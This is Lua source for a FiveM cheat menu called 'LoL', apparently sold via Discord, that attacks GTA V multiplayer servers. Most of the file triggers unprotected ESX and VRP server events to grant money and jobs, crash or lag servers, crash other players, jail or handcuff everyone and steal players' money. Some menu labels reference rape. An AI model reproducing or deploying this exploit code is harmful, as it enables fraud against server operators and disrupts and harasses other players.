...
local function debugPrint(text)
    if LoL.debug then
        Citizen.Trace("[LoL] "..tostring(text))
    end
end
...
function LoL.CreateMenu(id, title)
    -- Default settings
    menus[id] = { }
...
function LoL.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        LoL.CreateMenu(id, menus[parent].title)
...
function LoL.CurrentMenu()
    return currentMenu
end


function LoL.OpenMenu(id)
    if id and menus[id] then
...
function LoL.IsMenuOpened(id)
    return isMenuVisible(id)
end


function LoL.IsAnyMenuOpened()
...
function LoL.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
...
function LoL.Button(text, subText)
...
function LoL.MenuButton(text, id)
    if menus[id] then
        if LoL.Button(text) then
            setMenuVisible(currentMenu, false)
...
function LoL.CheckBox(text, checked, callback)
    if LoL.Button(text, checked and "~w~~h~On" or "~h~~c~Off") then
        checked = not checked
...
function LoL.ComboBox(text, items, currentIndex, selectedIndex, callback)
    ...
    if LoL.Button(text, selectedItem) then
...
function LoL.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function LoL.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function LoL.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function LoL.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function LoL.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function LoL.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function LoL.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function LoL.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function LoL.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function LoL.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function LoL.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function LoL.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function LoL.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function LoL.SetMenuButtonPressedSound(id, name, set)
                    ...
                    function()
                        ...
                        for i = 0, 256 do
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                '',
                                --'Dev ALSHMMRI & AK Team https://discord.gg/v9H3epz',
                                43161337
                            )
...
function teleportToNearestVehicle()
    ...
    Citizen.CreateThread(function()
        while discordPresence do
            ...
            SetDiscordRichPresenceAssetText("6666 Menu | \77\97\100\101\32\98\121\32\102\111\114\105\118\35\55\48\51\51")

            --Here you will have to put the image name for the "small" icon.
            SetDiscordRichPresenceAssetSmall("6666")

            --Here you can add hover text for the "small" icon.
            SetDiscordRichPresenceAssetSmallText("Contact \102\111\114\105\118\35\55\48\51\51 for purchase!")
    ...
    function()
        while true do
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "https://discord.gg/jmemEZ")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "https://discord.gg/jmemEZ")
					end
				end
...
Citizen.CreateThread(
    function()
        ...
        LoL.CreateMenu("MainMenu", "~r~LoL")
        LoL.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
		LoL.CreateSubMenu("MODEL", "MainMenu", "MODEL PLAYER")
        LoL.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
        LoL.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
        LoL.CreateSubMenu("Fuck", "MainMenu", "Fuck")
        LoL.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
        LoL.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
        LoL.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
        LoL.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
        LoL.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
        LoL.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
        LoL.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
        LoL.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
        LoL.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
		LoL.CreateSubMenu("AI", "MainMenu", "AI Menu")
		LoL.CreateSubMenu("Credits", "MainMenu", "Credits")
        LoL.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
        LoL.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
        LoL.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
        LoL.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
        LoL.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
        LoL.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
        LoL.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
		LoL.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
        LoL.CreateSubMenu('CarTypeSelection', 'CarTypes', ':D')
        LoL.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Car Options')
        LoL.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
        LoL.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
        LoL.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
        LoL.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        LoL.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
        LoL.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
        LoL.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
        LoL.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
        LoL.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
        LoL.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
        ...
        local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
                            ...
                            "ESXMiscMenu", "ESXDrugMenu", "AI", "CarTypes", "MODEL", "CarTypeSelection", "CarOptions", "Credits", "VRPMenu"}


        while Enabled do
            if LoL.IsMenuOpened("MainMenu") then
                drawNotification("~r~~r~LoL")
                drawNotification("~b~~b~LoL")
                if LoL.MenuButton    ("~r~Self Menu", "SelfMenu") then
                elseif LoL.MenuButton("~r~Teleport Menu", "TeleportMenu") then
				elseif LoL.MenuButton("~r~MODEL  ~h~~r~", "MODEL") then
				elseif LoL.MenuButton("~r~AI Menu", "AI") then
                elseif LoL.MenuButton("~r~Online Players", "OnlinePlayersMenu") then
                elseif LoL.MenuButton("~r~Weapons Menu", "WeaponMenu") then
                elseif LoL.MenuButton("~r~Cars Menu", "VehMenu") then
                elseif LoL.MenuButton("~r~General Hacks", "MaliciousMenu") then
                elseif LoL.MenuButton("~r~Trolling Options", "TrollMenu") then
                elseif LoL.MenuButton("~r~ESX~s~ Options", "ESXMenu") then
                elseif LoL.MenuButton("~r~Server SETTINGS", "Fuck") then
                elseif LoL.MenuButton("~r~VRP~s~ SETTINGS", "VRPMenu") then
				elseif LoL.MenuButton("~r~Made by", "Credits") then
                elseif LoL.Button("~h~~r~Disable Menu") then
                    Enabled = false
                end

                LoL.Display()
            elseif LoL.IsMenuOpened("VRPMenu") then
                if LoL.Button("VRP PayGarage 100$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100})
                elseif LoL.Button("VRP PayGarage 1000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
                elseif LoL.Button("VRP PayGarage 10 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
                elseif LoL.Button("VRP PayGarage 100 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
                elseif LoL.Button("VRP Get Driver Licence") then
                    TriggerServerEvent("dmv:success")
                elseif LoL.Button("VRP Bank Deposit") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:deposit", amount)
                elseif LoL.Button("VRP Bank Withdraw") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:withdraw", amount)
                elseif LoL.Button("VRP Slot Machine") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
            ...
            LoL.Display()
            elseif LoL.IsMenuOpened("SettingsMenu") then
                if LoL.ComboBox("Menu X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                    currentMenuX = currentIndex
                    selectedMenuX = selectedIndex
                    for i = 1, #allMenus do
                        LoL.SetMenuX(allMenus[i], menuX[currentMenuX])
                    end
                    end) 
                    then
                elseif LoL.ComboBox("Menu Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                    currentMenuY = currentIndex
                    selectedMenuY = selectedIndex
                    for i = 1, #allMenus do
                        LoL.SetMenuY(allMenus[i], menuY[currentMenuY])
                    end
                    end)
                    then
                end
                ...
                LoL.Display()
            elseif LoL.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if LoL.MenuButton('~h~~p~#~s~ ' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                LoL.Display()
            elseif LoL.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if LoL.MenuButton('~h~~p~#~s~ ~h~~r~>~s~ ' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                LoL.Display()
            elseif LoL.IsMenuOpened('CarOptions') then
                if LoL.Button('~h~~r~Spawn Car') then
				...
				LoL.Display()
			elseif LoL.IsMenuOpened("MODEL") then	
			if LoL.Button("~p~~h~BlackOps") then
			...
			elseif LoL.Button("~p~~h~CHEF") then
			local model = "s_m_y_chef_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif LoL.Button("~p~~h~POLICE") then
			local model = "s_m_y_marine_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif LoL.Button("~p~~h~ZBAL") then
			local model = "s_m_y_garbage"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif LoL.Button("~p~~h~6YAR") then
			local model = "s_m_y_pilot_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif LoL.Button("~p~~h~MSJON") then
			local model = "s_m_y_prisoner_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif LoL.Button("~p~~h~invisible") then
			...
			elseif LoL.Button("~r~~h~RANDOM CLOTH") then
		...
		LoL.Display()
		elseif LoL.IsMenuOpened("Fuck") then
		if LoL.Button("~h~~r~GIVE ALL PLAYERS WEAPONS") then
					for ids = 0, 128 do
            ...
            elseif
                 ...
                 then
				elseif LoL.Button("~h~~r~REMOVE ALL PLAYERS WEAPONS") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
	...
	then
                ...
                LoL.Display()
            elseif LoL.IsMenuOpened("TrollMenu") then
                if LoL.Button("~o~ESX Crash Server") then
                ...
                elseif  LoL.CheckBox(
                    "~o~Send everyone to jail",
                    banallusers,
                    function(enabled)
                    banallusers = enabled
                    end)
                then
				elseif LoL.Button("~p~Spawn LIONS ON ALL") then
				...
				elseif LoL.Button("~p~SPAWN SWAT ON ALL") then
                ...
                elseif LoL.Button("~r~TFGER Server") then
                    nukeserver()
				elseif LoL.Button("~b~Esx LAG V5") then
				    esxdestroyv2()
				elseif LoL.Button("~b~ESX GIVE ALL PAYCHECKS") then
				...
				elseif LoL.Button("~b~ESX GIVE ALL DOUBLE CHECKS") then
				for i = 0, 128 do
				...
				elseif LoL.Button("~r~VRP Destroy V2") then
				    vrpdestroy()
                elseif LoL.Button("~o~Rape All Players") then
                    RapeAllFunc()
                elseif LoL.CheckBox("~p~ Explode Everyone", blowall, function(enabled) blowall = enabled end) then
				elseif LoL.CheckBox("~b~FUCK ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                elseif LoL.CheckBox("~p~Freeze Everyone", fall, function(enabled) fall = enabled end) then
			    elseif LoL.CheckBox("~p~Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                elseif LoL.CheckBox("~r~Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
                elseif LoL.Button("~r~Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif LoL.Button("~o~FAKE MESSAGES") then
                ...
                elseif LoL.Button("~b~ESX MAKE ALL POLICE") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "police", 3)
                    end
                elseif LoL.Button("~b~ESX MAKE ALL MECHANIC") then
                    for i = 0, 128 do
                ...
                LoL.Display()
            elseif LoL.IsMenuOpened("TeleportMenu") then
                if LoL.Button("~o~Teleport To POINT") then
                    TeleportToWaypoint()
                elseif LoL.Button("~o~Teleport TO NEAR CAR") then
                    teleportToNearestVehicle()
                elseif LoL.Button("~o~Teleport To A7dathya") then
                    TeleportToCoords()
                elseif LoL.CheckBox(
                    "~p~Show A7dathya",
                    showCoords,
                ...
                LoL.Display()
			elseif LoL.IsMenuOpened("AI") then
			                if LoL.Button("~rAI Speed Settings") then
                ...
                elseif LoL.Button("~b~AI Drive (Waypoint_Slow)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                ...
                elseif LoL.Button("~b~AI Drive (Waypoint_Fast)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                ...
                elseif LoL.Button("~b~Stop AI") then
                    ...
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ...
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				                ...
				                LoL.Display()
            elseif LoL.IsMenuOpened("VehMenu") then
                if LoL.Button("~b~FIX CAR") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif LoL.Button("~b~REPAIR ENGINE") then
        ...
        drawNotification(
            "You are not sitting in a vehicle mate"
				...
				SetVehicleOilLevel(veh, 1000.0)
					    ...
					    elseif LoL.MenuButton('~h~~p~#~s~ Vehicle List', 'CarTypes') then

						elseif LoL.Button("~r~BUY FREE VEHICLES") then fv()
					elseif
					LoL.CheckBox(
					"~p~COLORED VEHICLES",
					RainbowVeh,
				...
				then
                elseif LoL.Button("~p~SPAWN CARS") then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "LoL")
                    else
                        drawNotification("~r~Model is not valid!")
                    end
                elseif LoL.MenuButton("~r~CUSTOMS", "LSC") then
				                elseif
                    LoL.CheckBox(
                 ...
                 then
                elseif LoL.Button("~r~DELETE CAR") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					LoL.CheckBox(
						"~o~NO FALL DAMAGE",
				 ...
				 then
				elseif LoL.Button("~p~CHANGE LICENSE CAR") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
			...
			then
                ...
                LoL.Display()
            elseif LoL.IsMenuOpened("ESXMenu") then
                if LoL.MenuButton("~b~ESX MONEY SETTINGS", "ESXMoneyMenu") then
                elseif LoL.MenuButton("~b~ESX JOB SETTINGS", "ESXJobMenu") then
                elseif LoL.MenuButton("~b~ESX KING", "ESXBossMenu") then
                elseif LoL.MenuButton("~b~ESX DRGS", "ESXDrugMenu") then
                elseif LoL.MenuButton("~b~ESX GENERAL", "ESXMiscMenu") then
                end

                LoL.Display()
            elseif LoL.IsMenuOpened("ESXMiscMenu") then
                if LoL.Button("~b~ESX HARVEST") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif LoL.Button    ("~b~ESX GET CARS LICENSES ") then
					TriggerServerEvent("dmv:success")
                ...
                elseif LoL.Button("~b~ESX CRAFTS") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
                end

                LoL.Display()
            elseif LoL.IsMenuOpened("ESXDrugMenu") then
                if LoL.Button("Harvest Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                elseif LoL.Button("Transform Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                elseif LoL.Button("Sell Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                elseif LoL.Button("Harvest Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                elseif LoL.Button("Transform Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                elseif LoL.Button("Sell Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                elseif LoL.Button("Harvest Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                elseif LoL.Button("Transform Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                elseif LoL.Button("Sell Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                elseif LoL.Button("Harvest Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                elseif LoL.Button("Transform Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                elseif LoL.Button("Sell Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent ("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                elseif LoL.Button("Money Wash (x10)") then
                    ...
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                elseif LoL.Button("Stop all (Drugs)") then
			...
			elseif LoL.Button("~g~Caution give back $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif LoL.Button("~g~Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif LoL.Button("~g~Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif LoL.Button("~g~Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif LoL.Button("~g~Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif LoL.Button("~g~Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif LoL.Button("~g~Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif LoL.Button("~g~ LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif LoL.Button("~g~Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif LoL.Button("~g~Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif LoL.Button("~g~Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif LoL.Button("~g~Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif LoL.Button("~g~Pilot & Taxi (ESX) $") then
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
			elseif LoL.Button("~g~Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif LoL.Button("~g~Paycheck $") then
                ...
                LoL.Display()
            elseif LoL.IsMenuOpened("SelfMenu") then
                if LoL.Button("Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif LoL.Button("Give Armor") then
                ...
                then
                elseif LoL.Button("ESX Set Hunger/Thirst To 100%") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif LoL.Button("Give yourself money (ESX)") then
                ...
                elseif LoL.Button("Revive") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif LoL.Button("~h~~b~Open Jail Menu ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif LoL.Button("ESX Get Out Of Jail") then
                ...
                elseif LoL.Button("Suicide") then
                ...
                LoL.Display()
            elseif LoL.IsMenuOpened("OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and LoL.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), "PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

                    LoL.Display()
				elseif LoL.IsMenuOpened("Credits") then
				    if LoL.Button("∑~r~LoL") then
				elseif LoL.Button("∑~r~~r~LoL") then
				elseif LoL.Button("∑~r~~r~LoL") then
				elseif LoL.Button("∑~r~~r~LoL") then
				elseif LoL.Button("∑~r~LoL") then
				end
				LoL.Display()
                elseif LoL.IsMenuOpened("PlayerOptionsMenu") then
                    LoL.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if LoL.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
                        SpectatePlayer(SelectedPlayer)
					elseif LoL.Button("Rape Player") then
					    rapeplayer()
					elseif LoL.Button("Open inventory") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif LoL.Button("Teleport To Player With Vehicle") then
										drawNotification(
                    ...
                    elseif LoL.Button("Teleport To Player") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
					...
					elseif LoL.Button("~g~Give ~w~Money") then
                    ...
                    elseif LoL.Button("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif LoL.MenuButton("Troll Options", "PlayerTrollMenu") then
                    elseif LoL.MenuButton("~b~ESX SETTINGS", "PlayerESXMenu") then
                    elseif LoL.MenuButton("Choose weapon", "SingleWepPlayer") then
                    elseif LoL.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif LoL.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                        end
                    elseif LoL.Button("Remove All Weapons") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                        end
                    elseif LoL.Button("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayer)
                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					...
					elseif LoL.Button('Clone Car') then
                    ClonePedVeh()
					elseif LoL.Button('Spawn Following Asshat') then
                    Citizen.CreateThread(function()
                    asshat = true
                    ...
                    if HasModelLoaded(veh) then
                        ...
                        elseif LoL.Button("Kick From Vehicle") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        drawNotification("~g~Kicked Player From Vehicle!")
                    elseif LoL.Button("Delete Vehicle") then
                        DelVeh(GetVehiclePedIsUsing(SelectedPlayer))
                    elseif LoL.Button("Spawn Flare On Player") then
                    ...
                    elseif LoL.Button("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    ...
                    LoL.Display()
                elseif LoL.IsMenuOpened("PlayerESXMenu") then
                    if LoL.MenuButton("ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif LoL.MenuButton("ESX Jobs", "PlayerESXJobMenu") then
                    end

                    LoL.Display()
                elseif LoL.IsMenuOpened("PlayerESXTriggerMenu") then
                    if LoL.Button("ESX Revive") then
                    ...
                    DoScreenFadeIn(800)
					elseif LoL.Button("Fire player from job (ESX)") then
				    FirePlayer(SelectedPlayer)
                    elseif LoL.Button("ESX Give Money To Player From Your Wallet") then
                    ...
                    elseif LoL.Button("ESX Steal Money From Player") then
                    ...
                    elseif LoL.Button("ESX Handcuff Player") then
                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif LoL.Button("ESX Send To Jail") then
                    ...
                    LoL.Display()
                elseif LoL.IsMenuOpened("PlayerESXJobMenu") then
                    if LoL.Button("Unemployed") then
                    ...
                    LoL.Display()
                elseif LoL.IsMenuOpened("PlayerTrollMenu") then
